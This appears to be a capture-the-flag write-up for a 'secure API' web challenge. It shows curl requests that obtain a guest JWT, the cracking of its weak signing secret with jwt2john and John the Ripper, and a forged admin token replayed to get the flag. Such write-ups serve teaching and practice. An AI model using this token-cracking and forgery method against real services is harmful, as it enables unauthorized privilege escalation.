## Description

<p align="center">
<img src="Image/image-20210518145549748.png">
</p>

## Solution

We got this when we entered the URL.

<p align="center">
<img src="Image/image-20210518145643186.png">
</p>

From the title we know that this challenge something related to API and we see that it says Authorization header not found and we need to login using guest credentials.

Then we found an endpoint called `/login`

We found a better way to use [Curl](https://curl.se/) command to solve this challenge

`curl http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login`

<p align="center">
<img src="Image/image-20210518150027997.png">
</p>

Method Not Allowed? Seems like we  need to change the method to POST

<p align="center">
<img src="Image/image-20210518150110148.png">
</p>

Cool, we need to supply username and password to it.

`curl -X POST -d "username=guest&password=guest" http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login`

<p align="center">
<img src="Image/image-20210518151113482.png">
</p>

We got the JWT token from the response !

We can first pass the token to the authorization to see what is the respond from the server.

`curl -X GET -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxMzIzNjYwfQ.Dz0TTYZKlm7VqZB6Vc-IcmoTcrijwe6ix_esKxd85irGW4eCA8XNHEKAOtq8YPlg3Px9aQdblJYvmPgwPbLXTQ" http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/ `

<p align="center">
<img src="Image/image-20210518152050487.png">
</p>

We are not admin :( guess we need to crack the token first and modify it to become admin.

Now we can use [JWTcrack](https://github.com/Sjord/jwtcrack) to crack the 256-bit secret. We can use **jwt2john** to convert it to hash and let [John The Ripper](https://en.wikipedia.org/wiki/John_the_Ripper) to decode it for us.

<p align="center">
<img src="Image/image-20210518151748479.png">
</p>

<p align="center">
<img src="Image/image-20210518151816968.png">
</p>

We got the secret which is `147852369`

Now we can use [JWT editor](https://jwt.io/) to edit the data.

Change the payload username from **guest** to **admin**.

We can also pass the secret that we found earlier at the verify signature section.

Whole modified data should look like this.

<p align="center">
<img src="Image/image-20210518152304811.png">
</p>

Copy the newly edited token and put it at the command again.

`curl -X GET -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxMzIzNjYwfQ.UhIK5Jbu-pxxlqpreX1cKK0m_Tm9BI-AcL3J2wW0CPoLF7a5j_aLrORYOqp0RF9jtSS0TMJKl5QgN5PpFljRLQ" http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/`

<p align="center">
<img src="Image/image-20210518152328325.png">
</p>

Got flag :)
